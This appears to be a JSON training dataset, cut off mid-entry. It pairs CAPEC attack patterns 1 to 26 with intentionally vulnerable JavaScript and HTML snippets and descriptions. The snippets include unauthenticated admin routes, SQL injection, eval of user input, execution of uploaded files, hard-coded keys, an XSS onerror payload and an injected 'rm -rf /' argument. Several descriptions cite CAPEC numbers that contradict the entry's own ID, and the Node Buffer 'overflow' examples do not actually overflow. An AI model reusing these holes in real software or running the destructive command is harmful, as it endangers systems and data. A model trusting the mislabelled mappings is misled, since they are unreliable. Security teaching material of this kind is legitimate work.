[
    {
        "capec_id": "1",
        "capec_name": "Accessing Functionality Not Properly Constrained by ACLs",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Middleware to check if user is authenticated\nfunction isAuthenticated(req, res, next) {\n  if (req.user) {\n    return next();\n  } else {\n    res.status(403).send('Forbidden');\n  }\n}\n\n// Route without proper ACL\napp.get('/admin', (req, res) => {\n  res.send('Welcome to the admin panel');\n});\n\n// Route with proper ACL\napp.get('/secure-admin', isAuthenticated, (req, res) => {\n  res.send('Welcome to the secure admin panel');\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server. It demonstrates a common security vulnerability where access to certain functionality is not properly constrained by Access Control Lists (ACLs). The '/admin' route is accessible without any authentication, representing a failure to specify an ACL, which could allow unauthorized users to access sensitive functionality. In contrast, the '/secure-admin' route uses a middleware function 'isAuthenticated' to check if the user is authenticated before granting access, representing a proper ACL implementation. This example highlights the importance of correctly implementing access controls to prevent unauthorized access, as described in the CAPEC and related CWEs."
    },
    {
        "capec_id": "2",
        "capec_name": "Inducing Account Lockout",
        "code_snippet": "const users = { 'user1': { password: 'password123', attempts: 0, locked: false } }; const MAX_ATTEMPTS = 3; function login(username, password) { if (users[username].locked) { console.log('Account is locked.'); return; } if (users[username].password === password) { console.log('Login successful'); users[username].attempts = 0; } else { users[username].attempts++; if (users[username].attempts >= MAX_ATTEMPTS) { users[username].locked = true; console.log('Account locked due to too many failed attempts.'); } else { console.log('Incorrect password.'); } } } // Simulating an attack by making multiple failed login attempts login('user1', 'wrongpassword'); login('user1', 'wrongpassword'); login('user1', 'wrongpassword'); login('user1', 'password123');",
        "description": "This JavaScript code snippet demonstrates a simple login mechanism with an account lockout feature. The `login` function checks if the account is locked before allowing login attempts. If the password is incorrect, it increments the `attempts` counter. After a certain number of failed attempts (defined by `MAX_ATTEMPTS`), the account is locked. This mechanism can be exploited by an attacker to lock out a legitimate user by making multiple failed login attempts. This embodies the CAPEC idea of 'Inducing Account Lockout' and highlights the CWE-645 'Overly Restrictive Account Lockout Mechanism' by showing how easily an account can be locked. The code also touches on CWE-307 'Improper Restriction of Excessive Authentication Attempts' by not implementing measures to prevent rapid successive attempts."
    },
    {
        "capec_id": "3",
        "capec_name": "Using Leading 'Ghost' Character Sequences to Bypass Input Filters",
        "code_snippet": "function validateInput(input) {\n  // Early validation before canonicalization\n  if (!/^[a-zA-Z0-9]+$/.test(input)) {\n    throw new Error('Invalid input');\n  }\n  // Canonicalization step\n  input = input.replace(/^\\u200B+/, ''); // Remove leading zero-width space characters\n  // Further processing\n  if (input === 'admin') {\n    console.log('Access granted');\n  } else {\n    console.log('Access denied');\n  }\n}\n\ntry {\n  validateInput('\\u200B\\u200Badmin'); // Ghost characters\n} catch (e) {\n  console.error(e.message);\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerability where leading 'ghost' characters (zero-width space characters) are used to bypass input validation. The `validateInput` function first performs an early validation check to ensure the input contains only alphanumeric characters. However, this validation occurs before the canonicalization step, where leading zero-width space characters are removed. As a result, an input like '\\u200B\\u200Badmin' (which includes ghost characters) can bypass the initial validation and be processed as 'admin', granting unauthorized access. This example highlights the importance of proper input validation order and handling of alternate encodings, as described in the CAPEC and related CWEs."
    },
    {
        "capec_id": "4",
        "capec_name": "Using Alternative IP Address Encodings",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  const clientIP = req.connection.remoteAddress;\n  const allowedIPs = ['192.168.1.1', '192.168.1.2'];\n\n  // Check if the client IP is in the allowed list\n  if (allowedIPs.includes(clientIP)) {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Access granted');\n  } else {\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Access denied');\n  }\n});\n\nserver.listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server that checks the client's IP address against a list of allowed IP addresses. If the client's IP address is in the allowed list, access is granted; otherwise, access is denied. This code is vulnerable to the 'Using Alternative IP Address Encodings' attack (CAPEC-273) because it relies on a specific format for IP addresses and does not account for alternative encodings. An attacker could use different IP address encodings to bypass the access control. The code also demonstrates CWE-291 (Reliance on IP Address for Authentication) and CWE-173 (Improper Handling of Alternate Encoding) by not properly validating the IP address format."
    },
    {
        "capec_id": "5",
        "capec_name": "Blue Boxing",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // Improper Verification of Source of a Communication Channel (CWE-940)\n    if (data.toString() === 'SUPERVISOR_TONE') {\n      // Improper Authorization (CWE-285)\n      console.log('Supervisor access granted.');\n      // Perform sensitive operations\n    } else {\n      console.log('Access denied.');\n    }\n  });\n\n  // Improper Restriction of Communication Channel to Intended Endpoints (CWE-923)\n  socket.on('end', () => {\n    console.log('Connection closed');\n  });\n});\n\nserver.listen(1337, '127.0.0.1');\nconsole.log('Server listening on port 1337');",
        "description": "This JavaScript code snippet creates a simple TCP server using the 'net' module. The server listens for incoming connections and processes data received from clients. The code demonstrates several vulnerabilities related to the CAPEC 'Blue Boxing' attack pattern:\n\n1. **Improper Verification of Source of a Communication Channel (CWE-940)**: The server checks if the received data matches a specific 'SUPERVISOR_TONE' string to grant supervisor access, without verifying the source of the communication.\n\n2. **Improper Authorization (CWE-285)**: If the data matches 'SUPERVISOR_TONE', the server grants supervisor access and performs sensitive operations without proper authorization checks.\n\n3. **Improper Restriction of Communication Channel to Intended Endpoints (CWE-923)**: The server does not ensure that it is communicating with the correct endpoint, allowing any client to connect and potentially exploit the system.\n\nThis code represents the main idea of the Blue Boxing attack, where an adversary can send a specific tone to impersonate a supervisor signal and gain unauthorized access to sensitive functions."
    },
    {
        "capec_id": "6",
        "capec_name": "Argument Injection",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction runCommand(userInput) {\n    // CWE-78: Improper Neutralization of Special Elements used in an OS Command\n    exec(`ls ${userInput}`, (error, stdout, stderr) => {\n        if (error) {\n            console.error(`Error: ${error.message}`);\n            return;\n        }\n        if (stderr) {\n            console.error(`Stderr: ${stderr}`);\n            return;\n        }\n        console.log(`Stdout: ${stdout}`);\n    });\n}\n\n// Example of vulnerable input\nrunCommand('&& rm -rf /');",
        "description": "This JavaScript code snippet demonstrates an Argument Injection vulnerability (CAPEC-137) by using the 'exec' function from the 'child_process' module to run a shell command. The function 'runCommand' takes user input and directly incorporates it into an OS command without proper validation or neutralization (CWE-78). This allows an attacker to inject malicious commands, such as '&& rm -rf /', which could lead to severe consequences like deleting critical files. The code highlights the risk of improper neutralization of special elements and the potential for command injection attacks."
    },
    {
        "capec_id": "7",
        "capec_name": "Blind SQL Injection",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst mysql = require('mysql');\n\nconst connection = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'password',\n  database: 'test_db'\n});\n\napp.get('/user', (req, res) => {\n  const userId = req.query.id;\n  const query = `SELECT * FROM users WHERE id = '${userId}'`;\n\n  connection.query(query, (error, results) => {\n    if (error) {\n      res.send('An error occurred');\n    } else {\n      res.json(results);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up a basic Express.js server with a MySQL database connection. The server has a single endpoint `/user` that takes a user ID as a query parameter and constructs an SQL query to fetch user details from the database. The query is constructed using string interpolation, which makes it vulnerable to SQL Injection attacks. The code attempts to handle errors by sending a generic error message, but this does not prevent SQL Injection. This example embodies the main idea of Blind SQL Injection (CAPEC-111) by showing how an attacker could exploit the lack of proper input validation (CWE-20) and improper neutralization of special elements (CWE-89) to infer information from the database without receiving detailed error messages."
    },
    {
        "capec_id": "8",
        "capec_name": "Buffer Overflow in an API Call",
        "code_snippet": "const vulnerableLibrary = require('vulnerable-library');\n\nfunction processData(input) {\n  let buffer = Buffer.alloc(10); // Allocate a buffer of size 10\n  buffer.write(input); // CWE-120: No size check on input\n  return buffer.toString();\n}\n\n// Example usage\nlet userInput = 'A'.repeat(20); // CWE-20: Improper Input Validation\nconsole.log(processData(userInput));",
        "description": "This JavaScript code snippet demonstrates a buffer overflow vulnerability in an API call, as described in the CAPEC. The `processData` function uses a buffer of fixed size (10 bytes) and writes user input directly into it without checking the input size (CWE-120). This can lead to a buffer overflow if the input exceeds the buffer size. The example usage shows how an attacker can exploit this by providing an input string that is larger than the buffer, leading to potential memory corruption and security issues. This snippet also highlights CWE-20, as there is no proper validation of the user input before processing."
    },
    {
        "capec_id": "9",
        "capec_name": "Buffer Overflow in Local Command-Line Utilities",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction runCommand(userInput) {\n  const buffer = Buffer.alloc(10);\n  buffer.write(userInput, 'utf8');\n\n  exec(buffer.toString(), (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.error(`stderr: ${stderr}`);\n  });\n}\n\n// Example usage\nrunCommand('ls -la');",
        "description": "This JavaScript code snippet demonstrates a vulnerable command-line utility that can be exploited for a buffer overflow attack. The `runCommand` function takes user input and writes it to a buffer of fixed size (10 bytes) without checking the length of the input. This can lead to a buffer overflow if the input exceeds the buffer size. The buffer content is then executed as a shell command using `exec`, which can lead to privilege escalation if an attacker provides malicious input. This snippet embodies the main idea of CAPEC 'Buffer Overflow in Local Command-Line Utilities' and incorporates related CWEs such as CWE-120 (Buffer Copy without Checking Size of Input), CWE-20 (Improper Input Validation), and CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component)."
    },
    {
        "capec_id": "10",
        "capec_name": "Buffer Overflow via Environment Variables",
        "code_snippet": "const exec = require('child_process').exec;\n\n// Vulnerable function that uses an environment variable\nfunction runCommand() {\n  const userInput = process.env.USER_INPUT;\n  const buffer = Buffer.alloc(50); // Allocate a buffer of 50 bytes\n\n  // CWE-120: Buffer Copy without Checking Size of Input\n  buffer.write(userInput, 'utf8'); // No size check, potential overflow\n\n  // CWE-74: Improper Neutralization of Special Elements\n  exec(buffer.toString(), (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.error(`stderr: ${stderr}`);\n  });\n}\n\n// Simulate setting an environment variable\nprocess.env.USER_INPUT = 'A'.repeat(100); // Overly long input to cause overflow\nrunCommand();",
        "description": "This JavaScript code snippet demonstrates a buffer overflow vulnerability via environment variables. The function `runCommand` reads an environment variable `USER_INPUT` and writes it to a buffer of fixed size (50 bytes) without checking the input size, leading to a potential buffer overflow (CWE-120). Additionally, the code uses the `exec` function to execute the buffer content, which can lead to command injection if special elements are not properly neutralized (CWE-74). The environment variable is set to a long string to simulate an overflow scenario."
    },
    {
        "capec_id": "11",
        "capec_name": "Cause Web Server Misclassification",
        "code_snippet": "const express = require('express');\nconst fileUpload = require('express-fileupload');\nconst app = express();\n\napp.use(fileUpload());\n\napp.post('/upload', (req, res) => {\n  if (!req.files || Object.keys(req.files).length === 0) {\n    return res.status(400).send('No files were uploaded.');\n  }\n\n  let uploadedFile = req.files.uploadedFile;\n  let fileName = uploadedFile.name;\n\n  // Vulnerable: relying on file extension to determine file type\n  if (fileName.endsWith('.jpg')) {\n    // Process as an image\n    uploadedFile.mv(`/uploads/images/${fileName}`, err => {\n      if (err) return res.status(500).send(err);\n      res.send('File uploaded!');\n    });\n  } else if (fileName.endsWith('.txt')) {\n    // Process as a text file\n    uploadedFile.mv(`/uploads/texts/${fileName}`, err => {\n      if (err) return res.status(500).send(err);\n      res.send('File uploaded!');\n    });\n  } else {\n    // Default action\n    res.status(400).send('Unsupported file type.');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server started on http://localhost:3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple file upload server. The server processes uploaded files based on their file extensions. This approach is vulnerable because it relies on the file name or extension to determine the appropriate behavior, which can be exploited by attackers to cause the file to be misclassified and processed in a dangerous fashion. For example, an attacker could upload a file with a misleading extension to trick the server into processing it incorrectly, potentially leading to resource exhaustion, exposure of sensitive data, or other unintended actions. This snippet embodies the main idea of CAPEC-147 (Cause Web Server Misclassification) and demonstrates related CWEs such as CWE-646 (Reliance on File Name or Extension of Externally-Supplied File) and CWE-430 (Deployment of Wrong Handler)."
    },
    {
        "capec_id": "12",
        "capec_name": "Choosing Message Identifier",
        "code_snippet": "const multicastChannel = new EventSource('http://example.com/multicast');\n\nmulticastChannel.onmessage = function(event) {\n    const message = JSON.parse(event.data);\n    if (message.clientId === 'targetClientId') {\n        console.log('Received message for target client:', message);\n        // Potentially sensitive information is logged\n        // No authentication or validation of the message\n    }\n};\n\n// Simulate sending a command to the bus with a privileged identifier\nfunction sendCommand(command) {\n    const privilegedCommand = {\n        clientId: 'privilegedClientId',\n        command: command\n    };\n    fetch('http://example.com/commandBus', {\n        method: 'POST',\n        headers: {\n            'Content-Type': 'application/json'\n        },\n        body: JSON.stringify(privilegedCommand)\n    }).then(response => response.json())\n      .then(data => console.log('Command response:', data));\n}\n\n// Example usage\nsendCommand('shutdown');",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to the 'Choosing Message Identifier' attack pattern. The code listens to a multicast channel and processes messages intended for a specific client without proper authentication or validation, potentially exposing sensitive information (CWE-201, CWE-306). Additionally, it simulates sending a command to a bus with a privileged identifier, which could be exploited if the conversion or decoding of security identifiers is incorrectly implemented (CWE-1292, CWE-1290). The code does not ensure message integrity during transmission (CWE-924), making it susceptible to tampering."
    },
    {
        "capec_id": "13",
        "capec_name": "Subverting Environment Variable Values",
        "code_snippet": "const fs = require('fs');\nconst exec = require('child_process').exec;\n\n// Vulnerable environment variable\nconst configPath = process.env.CONFIG_PATH || '/default/path/config.json';\n\n// CWE-73: External Control of File Name or Path\nfs.readFile(configPath, 'utf8', (err, data) => {\n  if (err) {\n    console.error('Error reading config file:', err);\n    return;\n  }\n  try {\n    const config = JSON.parse(data);\n    // CWE-20: Improper Input Validation\n    if (config && config.command) {\n      // CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n      exec(config.command, (error, stdout, stderr) => {\n        if (error) {\n          console.error('Command execution error:', error);\n          return;\n        }\n        console.log('Command output:', stdout);\n      });\n    }\n  } catch (parseError) {\n    console.error('Error parsing config file:', parseError);\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an environment variable (CONFIG_PATH) is used to control the path of a configuration file. The code reads the configuration file and executes a command specified within it. This embodies the CAPEC of 'Subverting Environment Variable Values' by allowing an attacker to modify the CONFIG_PATH environment variable to point to a malicious configuration file. The code also illustrates several related CWEs: CWE-73 (External Control of File Name or Path), CWE-20 (Improper Input Validation), and CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component). An attacker could exploit these weaknesses to execute arbitrary commands on the system."
    },
    {
        "capec_id": "14",
        "capec_name": "Client-side Injection-induced Buffer Overflow",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  let input = req.url.substring(1); // Extract input from URL\n  let buffer = Buffer.alloc(10); // Allocate a buffer of size 10\n\n  // CWE-120: Buffer Copy without Checking Size of Input\n  for (let i = 0; i < input.length; i++) {\n    buffer[i] = input.charCodeAt(i); // Potential buffer overflow\n  }\n\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end('Data received');\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. The server extracts input from the URL and attempts to copy it into a fixed-size buffer without checking the size of the input. This can lead to a buffer overflow if the input exceeds the buffer size. The code demonstrates a 'Client-side Injection-induced Buffer Overflow' (CAPEC) by showing how a maliciously crafted URL can exploit a buffer overflow vulnerability in the server. The code also embodies CWE-120 (Buffer Copy without Checking Size of Input) by not validating the input size before copying it into the buffer."
    },
    {
        "capec_id": "15",
        "capec_name": "Command Delimiters",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction executeCommand(userInput) {\n  // Vulnerable to command injection due to improper neutralization of special elements\n  const command = `ls ${userInput}`;\n  exec(command, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Stderr: ${stderr}`);\n      return;\n    }\n    console.log(`Stdout: ${stdout}`);\n  });\n}\n\n// Example usage\nexecuteCommand('&& echo vulnerable');",
        "description": "This JavaScript code snippet demonstrates a command injection vulnerability. The `executeCommand` function takes user input and concatenates it directly into a shell command without proper neutralization of special elements. This allows an attacker to inject additional commands using delimiters like '&&'. For example, passing '&& echo vulnerable' as input will execute the 'ls' command followed by 'echo vulnerable', demonstrating how an attacker can exploit this vulnerability to execute arbitrary commands. This snippet embodies the main idea of CAPEC-146 by showing how improper neutralization of command delimiters can lead to security issues."
    },
    {
        "capec_id": "16",
        "capec_name": "Dictionary-based Password Attack",
        "code_snippet": "const users = { 'user1': 'password123', 'user2': 'qwerty', 'user3': 'letmein' }; // Weak passwords\nconst dictionary = ['password', '123456', 'qwerty', 'abc123', 'letmein']; // Common dictionary words\n\nfunction dictionaryAttack(username) {\n  for (let word of dictionary) {\n    if (users[username] === word) {\n      console.log(`Access granted for ${username} with password: ${word}`);\n      return true;\n    }\n  }\n  console.log('Access denied');\n  return false;\n}\n\ndictionaryAttack('user1'); // Example attack\n",
        "description": "This JavaScript code snippet demonstrates a dictionary-based password attack. It defines a set of users with weak passwords and a dictionary of common passwords. The `dictionaryAttack` function attempts to log in by iterating through the dictionary and checking if any word matches the user's password. If a match is found, access is granted. This code highlights vulnerabilities such as weak password requirements (CWE-521), reliance on single-factor authentication (CWE-308), and improper restriction of excessive authentication attempts (CWE-307)."
    },
    {
        "capec_id": "17",
        "capec_name": "Using Malicious Files",
        "code_snippet": "const express = require('express');\nconst fileUpload = require('express-fileupload');\nconst fs = require('fs');\nconst app = express();\n\napp.use(fileUpload());\n\napp.post('/upload', (req, res) => {\n  if (!req.files || Object.keys(req.files).length === 0) {\n    return res.status(400).send('No files were uploaded.');\n  }\n\n  let uploadedFile = req.files.uploadedFile;\n  let uploadPath = __dirname + '/uploads/' + uploadedFile.name;\n\n  // Incorrect Permission Assignment for Critical Resource (CWE-732)\n  fs.writeFile(uploadPath, uploadedFile.data, { mode: 0o777 }, (err) => {\n    if (err) return res.status(500).send(err);\n\n    // Improper Authorization (CWE-285)\n    if (uploadedFile.mimetype !== 'application/x-executable') {\n      return res.status(403).send('File type not allowed.');\n    }\n\n    // Privilege Context Switching Error (CWE-270)\n    process.setuid(1000); // Switch to a non-privileged user\n\n    // Execute the uploaded file\n    require('child_process').exec(uploadPath, (err, stdout, stderr) => {\n      if (err) return res.status(500).send(err);\n      res.send('File executed successfully: ' + stdout);\n    });\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server started on http://localhost:3000');\n});",
        "description": "This JavaScript code snippet represents a vulnerable file upload and execution scenario using the Express framework. The code allows users to upload files to the server, which are then saved with incorrect permissions (CWE-732). The code also performs an improper authorization check (CWE-285) by only checking the MIME type of the uploaded file. Additionally, it demonstrates a privilege context switching error (CWE-270) by switching to a non-privileged user before executing the uploaded file. This setup can be exploited by an attacker to upload and execute malicious files on the server, embodying the main idea of the CAPEC 'Using Malicious Files'."
    },
    {
        "capec_id": "18",
        "capec_name": "XSS Targeting Non-Script Elements",
        "code_snippet": "<html>\n<body>\n  <img src=\"x\" onerror=\"alert('XSS Vulnerability!')\">\n  <!-- < !-CDATA-[<script>alert('XSS Vulnerability!')</script> ]]> -->\n</body>\n</html>",
        "description": "This HTML snippet demonstrates an XSS attack targeting non-script elements. The <img> tag includes an 'onerror' attribute that executes JavaScript when the image fails to load, which is a common XSS vector. Additionally, a comment section with CDATA is used to embed a script tag, which is another method to bypass input validation. This code highlights the vulnerabilities described in the CAPEC and related CWEs, such as improper neutralization of script-related HTML tags (CWE-80), script in attributes of IMG tags (CWE-82), and incomplete denylist mechanisms (CWE-692)."
    },
    {
        "capec_id": "19",
        "capec_name": "Embedding Scripts within Scripts",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  if (queryObject.script) {\n    try {\n      eval(queryObject.script); // CWE-284, CWE-79, CWE-506\n    } catch (e) {\n      res.writeHead(500, {'Content-Type': 'text/plain'});\n      res.end('Error executing script');\n      return;\n    }\n  }\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end('Script executed');\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates an HTTP server that listens on port 8080. It parses the URL query parameters and checks if a 'script' parameter is present. If so, it attempts to execute the script using the 'eval' function. This embodies the CAPEC 'Embedding Scripts within Scripts' by allowing an adversary to embed and execute their own script within the server's context. The use of 'eval' here is particularly dangerous and represents CWE-284 (Improper Access Control), CWE-79 (Cross-site Scripting), and CWE-506 (Embedded Malicious Code). The server does not properly restrict access to the 'eval' function, does not neutralize user input, and allows the execution of potentially malicious code."
    },
    {
        "capec_id": "20",
        "capec_name": "Encryption Brute Forcing",
        "code_snippet": "const crypto = require('crypto');\n\nconst algorithm = 'aes-128-cbc'; // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\nconst key = '1234567890123456'; // CWE-321: Use of Hard-coded Cryptographic Key\nconst iv = '1234567890123456'; // CWE-1204: Generation of Weak Initialization Vector (IV)\n\nconst encrypt = (text) => {\n  const cipher = crypto.createCipheriv(algorithm, key, iv);\n  let encrypted = cipher.update(text, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n};\n\nconst decrypt = (encrypted) => {\n  const decipher = crypto.createDecipheriv(algorithm, key, iv);\n  let decrypted = decipher.update(encrypted, 'hex', 'utf8');\n  decrypted += decipher.final('utf8');\n  return decrypted;\n};\n\nconst plaintext = 'Sensitive Data';\nconst ciphertext = encrypt(plaintext);\nconsole.log('Encrypted:', ciphertext);\nconsole.log('Decrypted:', decrypt(ciphertext));",
        "description": "This JavaScript code snippet demonstrates a vulnerable encryption implementation. It uses the AES-128-CBC algorithm (CWE-327), which is considered less secure compared to more modern algorithms. The key and IV are hard-coded (CWE-321 and CWE-1204), making them predictable and easily exploitable. An attacker with access to the ciphertext and knowledge of the algorithm could perform a brute force attack to discover the key and decrypt the data, as described in the CAPEC. The code highlights the risks associated with inadequate encryption strength and poor cryptographic practices."
    },
    {
        "capec_id": "21",
        "capec_name": "Exploitation of Trusted Identifiers",
        "code_snippet": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\n\n// Simulated user database\nconst users = { 'user1': 'password1' };\n\n// Simulated session store\nlet sessions = {};\n\n// Login endpoint\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username] === password) {\n    const sessionId = Math.random().toString(36).substring(2);\n    sessions[sessionId] = username;\n    res.cookie('sessionId', sessionId, { httpOnly: true, secure: false }); // CWE-539: Use of Persistent Cookies Containing Sensitive Information\n    res.send('Logged in');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\n// Protected endpoint\napp.get('/protected', (req, res) => {\n  const sessionId = req.cookies.sessionId;\n  if (sessions[sessionId]) {\n    res.send(`Hello, ${sessions[sessionId]}`);\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a simple Express.js application that demonstrates the concept of 'Exploitation of Trusted Identifiers' (CAPEC). The application has a login endpoint that issues a session ID stored in a cookie (CWE-539: Use of Persistent Cookies Containing Sensitive Information). The session ID is used to authenticate users for accessing a protected endpoint. The code does not invalidate old session IDs upon login (CWE-384: Session Fixation), and the session ID is predictable due to its insufficient length (CWE-6: J2EE Misconfiguration: Insufficient Session-ID Length). Additionally, the server relies on the client to store the session ID securely (CWE-602: Client-Side Enforcement of Server-Side Security). This setup makes it vulnerable to an attacker guessing or obtaining the session ID to impersonate an authenticated user."
    },
    {
        "capec_id": "22",
        "capec_name": "Exploiting Trust in Client",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Vulnerable authentication mechanism\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  // CWE-287: Improper Authentication\n  if (username === 'admin') {\n    // CWE-290: Authentication Bypass by Spoofing\n    res.send('Login successful');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\n// CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\napp.get('/user-data', (req, res) => {\n  const userData = {\n    username: 'admin',\n    password: 'supersecret'\n  };\n  res.json(userData);\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a simple Express.js server with two endpoints that embody the vulnerabilities described in the CAPEC and related CWEs. The '/login' endpoint has an improper authentication mechanism (CWE-287) that allows an attacker to bypass authentication by simply providing the username 'admin' (CWE-290). The '/user-data' endpoint exposes sensitive information (CWE-200) without proper authorization checks. This code represents the main idea of exploiting trust in client-server communication by leveraging weak authentication and exposing sensitive data."
    },
    {
        "capec_id": "23",
        "capec_name": "File Content Injection",
        "code_snippet": "const express = require('express');\nconst fileUpload = require('express-fileupload');\nconst fs = require('fs');\nconst path = require('path');\n\nconst app = express();\napp.use(fileUpload());\n\napp.post('/upload', (req, res) => {\n  if (!req.files || Object.keys(req.files).length === 0) {\n    return res.status(400).send('No files were uploaded.');\n  }\n\n  let uploadedFile = req.files.uploadedFile;\n  let uploadPath = path.join(__dirname, 'uploads', uploadedFile.name);\n\n  // Save the file without validating its type or content\n  uploadedFile.mv(uploadPath, (err) => {\n    if (err) {\n      return res.status(500).send(err);\n    }\n    res.send('File uploaded!');\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server started on http://localhost:3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple file upload server. The server allows users to upload files without validating the file type or content, which embodies the main idea of the CAPEC 'File Content Injection'. The code demonstrates several related CWEs: \n1. CWE-20 (Improper Input Validation): The server does not validate the uploaded file's content or type.\n2. CWE-434 (Unrestricted Upload of File with Dangerous Type): The server allows any file type to be uploaded without restriction.\n3. CWE-646 (Reliance on File Name or Extension of Externally-Supplied File): The server relies on the file name provided by the user, which could be misleading.\n4. CWE-433 (Unparsed Raw Web Content Delivery): The uploaded file is stored in the 'uploads' directory without any parsing or validation.\n5. CWE-506 (Embedded Malicious Code): The server could potentially store and serve files containing malicious code, as it does not inspect the file content."
    },
    {
        "capec_id": "24",
        "capec_name": "Filter Failure through Buffer Overflow",
        "code_snippet": "function processInput(input) {\n  var buffer = new Array(10);\n  for (var i = 0; i < input.length; i++) {\n    buffer[i] = input[i];\n  }\n  // Simulate a filter that fails to handle oversized input securely\n  if (input.length > buffer.length) {\n    console.log('Filter failed, input not properly handled.');\n  } else {\n    console.log('Input processed: ' + buffer.join(''));\n  }\n}\n\n// Example usage\nvar userInput = 'A'.repeat(20); // Overly long input\nprocessInput(userInput);",
        "description": "This JavaScript code snippet demonstrates a filter failure through buffer overflow. The function `processInput` takes an input string and attempts to copy it into a fixed-size buffer. If the input length exceeds the buffer size, it simulates a filter failure by logging a message. This code embodies the main idea of CAPEC-128, where an attacker can cause a filter to fail by providing an oversized input, leading to potential security vulnerabilities. The code also touches on related CWEs such as CWE-120 (Buffer Copy without Checking Size of Input) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer)."
    },
    {
        "capec_id": "25",
        "capec_name": "Forced Deadlock",
        "code_snippet": "const lock1 = { locked: false };\nconst lock2 = { locked: false };\n\nfunction acquireLock(lock) {\n  return new Promise((resolve) => {\n    (function waitForLock() {\n      if (!lock.locked) {\n        lock.locked = true;\n        resolve();\n      } else {\n        setTimeout(waitForLock, 10);\n      }\n    })();\n  });\n}\n\nfunction releaseLock(lock) {\n  lock.locked = false;\n}\n\nasync function task1() {\n  await acquireLock(lock1);\n  console.log('Task 1 acquired lock1');\n  await new Promise(resolve => setTimeout(resolve, 100)); // Simulate work\n  await acquireLock(lock2);\n  console.log('Task 1 acquired lock2');\n  releaseLock(lock2);\n  releaseLock(lock1);\n}\n\nasync function task2() {\n  await acquireLock(lock2);\n  console.log('Task 2 acquired lock2');\n  await new Promise(resolve => setTimeout(resolve, 100)); // Simulate work\n  await acquireLock(lock1);\n  console.log('Task 2 acquired lock1');\n  releaseLock(lock1);\n  releaseLock(lock2);\n}\n\ntask1();\ntask2();",
        "description": "This JavaScript code snippet demonstrates a forced deadlock scenario. Two tasks, `task1` and `task2`, attempt to acquire two locks, `lock1` and `lock2`, in opposite order. `task1` acquires `lock1` first and then tries to acquire `lock2`, while `task2` acquires `lock2` first and then tries to acquire `lock1`. This creates a deadlock condition where both tasks are waiting for each other to release the locks they need, resulting in neither task being able to proceed. This example embodies the main idea of the CAPEC 'Forced Deadlock' and illustrates related CWEs such as 'Improper Synchronization' and 'Deadlock'."
    },
    {
        "capec_id": "26",
        "capec_name": "Leveraging Race Conditions",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nconst filePath = path.join(__dirname, 'importantFile.txt');\n\n// Check if the file exists\nif (fs.existsSync(filePath)) {\n  // Read the file content\n  fs.readFile(filePath, 'utf8', (err, data) => {\n    if (err) throw err;\n    console.log('File content:', data);\n  });\n\n  // Simulate a delay\n  setTimeout(() => {\n    // Write to the file\n    fs.writeFile(filePath, 'New content', (err) => {\n      if (err) throw err;\n      console.log('File has been updated');\n    });\n  }, 100);\n}",
